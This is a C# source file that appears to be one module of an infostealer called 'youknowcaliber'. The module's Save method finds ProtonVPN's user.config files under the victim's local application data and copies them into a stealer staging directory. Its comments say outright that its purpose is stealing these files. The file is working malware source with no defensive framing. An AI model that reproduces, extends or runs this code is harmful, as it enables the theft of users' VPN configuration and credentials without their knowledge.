using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace youknowcaliber
{
    class ProtonVPN
    {
        public static void Save()
        {
            string Stealer_Dir = Help.ExploitDir;
            // "ProtonVPN" directory path
            string vpn = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ProtonVPN");
            // Stop if not exists
            if (!Directory.Exists(vpn))
                return;
            try
            {
                // Steal user.config files
                foreach (string dir in Directory.GetDirectories(vpn))
                    if (dir.Contains("ProtonVPN.exe"))
                        foreach (string version in Directory.GetDirectories(dir))
                        {
                            string config_location = version + "\\user.config";
                            string copy_directory = Path.Combine(Stealer_Dir + "\\VPN\\ProtonVPN", new DirectoryInfo(Path.GetDirectoryName(config_location)).Name);
                            if (!Directory.Exists(copy_directory))
                            {

                                Directory.CreateDirectory(copy_directory);
                                File.Copy(config_location, copy_directory + "\\user.config");
                                Counting.ProtonVPN++;
                            }
                        }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
